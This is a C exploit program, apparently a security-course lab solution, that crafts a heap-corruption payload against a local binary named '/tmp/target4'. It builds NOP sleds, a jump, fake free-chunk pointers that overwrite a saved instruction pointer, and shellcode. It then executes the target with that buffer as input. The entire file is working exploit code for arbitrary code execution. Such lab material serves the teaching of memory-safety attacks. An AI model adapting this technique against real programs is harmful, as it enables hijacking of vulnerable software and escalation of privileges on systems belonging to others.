#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"
#define BSIZE 1024
#define NOP 0x90

int main(void)
{
  char *args[3];
  char *buff;
  char *env[1];
  int bsize = BSIZE;
  int i;
  long *addr_ptr, addr;

  if (!(buff = malloc(bsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }
 
  // new eip (address of shellcode)
  unsigned long fakeq_left = 0x8059878;
  // address of eip
  unsigned long fakeq_right = 0xbffffa7c;

  // 4 bytes for fake p left: first instruction to run, need to jump over fake p right
  // NOP NOP JMP
  *buff = NOP;
  *(buff+1) = NOP;
  memcpy(buff+2, "\xeb\x03", 2);
  // 4 bytes for fake p right
  // fake right, free bit must be set to free
  *(unsigned long *)(buff+4) = fakeq_right+1;
  // 200  bytes for other code (shellcode + NOP)
  memset(buff+8, NOP, 200);
  memcpy(buff+208-sizeof(shellcode), shellcode, strlen(shellcode));
  // 4 bytes for overwriting original q left
  *(unsigned long *)(buff+208) = fakeq_left;
  // 4 bytes for overwriting original q right 
  *(unsigned long *)(buff+212) = fakeq_right;
  // 216-1024  bytes abitary things
  memset(buff+216, NOP, 808);

  buff[bsize - 1] = '\0';

  args[0] = TARGET; args[1] = buff; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
